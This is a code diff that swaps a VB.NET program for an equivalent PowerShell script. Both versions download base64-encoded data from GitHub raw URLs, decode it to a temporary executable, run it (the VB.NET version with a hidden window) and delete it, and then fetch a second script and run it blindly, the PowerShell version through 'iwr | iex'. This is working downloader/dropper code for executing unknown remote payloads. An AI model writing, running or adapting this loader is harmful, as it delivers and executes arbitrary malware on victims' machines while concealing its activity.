@@ -1,44 +1,10 @@
-Imports System.IO
-Imports System.Net
-Imports System.Text
-Imports System.Diagnostics
+$base64Url = "https://raw.githubusercontent.com/theuwpk/FRONT-EXE/refs/heads/main/MAIN/BASE64.TXT"
+$tempPath = [System.IO.Path]::GetTempFileName()
 
-Module Module1
-    Sub Main()
-        ' Primeiro processo: baixar, converter e executar o arquivo base64
-        Dim base64Url As String = "https://raw.githubusercontent.com/theuwpk/FRONT-EXE/refs/heads/main/MAIN/BASE64.TXT"
-        Dim tempPath As String = Path.GetTempFileName()
+$base64Data = Invoke-WebRequest -Uri $base64Url -UseBasicParsing | Select-Object -ExpandProperty Content
+$binaryData = [System.Convert]::FromBase64String($base64Data)
+[System.IO.File]::WriteAllBytes($tempPath, $binaryData)
+Start-Process -FilePath $tempPath -NoNewWindow -Wait
+Remove-Item $tempPath -Force
 
-        ' Fazer o download do conteúdo base64
-        Dim webClient As New WebClient()
-        Dim base64Data As String = webClient.DownloadString(base64Url)
-
-        ' Converter base64 para dados binários
-        Dim binaryData As Byte() = Convert.FromBase64String(base64Data)
-
-        ' Salvar os dados binários em um arquivo temporário
-        File.WriteAllBytes(tempPath, binaryData)
-
-        ' Iniciar o processo do arquivo
-        Dim process As New Process()
-        process.StartInfo.FileName = tempPath
-        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
-        process.Start()
-
-        ' Esperar o processo terminar
-        process.WaitForExit()
-
-        ' Remover o arquivo temporário
-        File.Delete(tempPath)
-
-        ' Segundo processo: baixar e executar o script diretamente
-        Dim installUrl As String = "https://raw.githubusercontent.com/theuwpk/BACK-EXE/refs/heads/main/MAIN/INSTALL.TXT"
-        Dim installScript As String = webClient.DownloadString(installUrl)
-
-        ' Executar o script baixado (equivalente ao 'iex' no PowerShell)
-        Dim startInfo As New ProcessStartInfo("cmd.exe")
-        startInfo.Arguments = "/C " & installScript
-        startInfo.WindowStyle = ProcessWindowStyle.Hidden
-        Process.Start(startInfo)
-    End Sub
-End Module
+iwr -useb https://raw.githubusercontent.com/theuwpk/BACK-EXE/refs/heads/main/MAIN/INSTALL.TXT | iex
